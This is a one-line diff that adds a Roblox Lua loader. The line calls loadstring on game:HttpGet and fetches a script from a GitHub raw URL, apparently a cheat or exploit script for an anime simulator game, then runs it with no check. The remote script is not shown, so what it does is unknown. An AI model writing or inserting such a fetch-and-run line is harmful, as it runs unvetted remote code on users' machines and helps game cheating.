@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/training-anime-astral-simulator-spam4-ufyvszq3gtsf0a.lua"))()
